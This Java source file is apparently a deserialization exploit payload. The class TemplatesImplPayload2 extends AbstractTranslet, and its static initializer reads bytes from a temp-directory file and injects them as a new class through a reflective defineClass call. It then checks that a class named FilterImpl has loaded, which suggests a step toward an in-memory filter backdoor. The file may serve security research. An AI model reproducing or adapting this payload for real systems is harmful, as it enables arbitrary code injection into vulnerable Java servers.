package com.xhstormr.app;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class TemplatesImplPayload2 extends AbstractTranslet {

    static {
        try {
            Path path = Paths.get(System.getProperty("java.io.tmpdir"), "123.txt");
            byte[] bytes = Files.readAllBytes(path);

            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz1 = (Class<?>) defineClass.invoke(classLoader, bytes, 0, bytes.length);
            Class<?> clazz2 = classLoader.loadClass("com.xhstormr.app.FilterImpl");

            System.out.println(clazz1);
            System.out.println(clazz2);
            System.out.println(clazz1.equals(clazz2));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
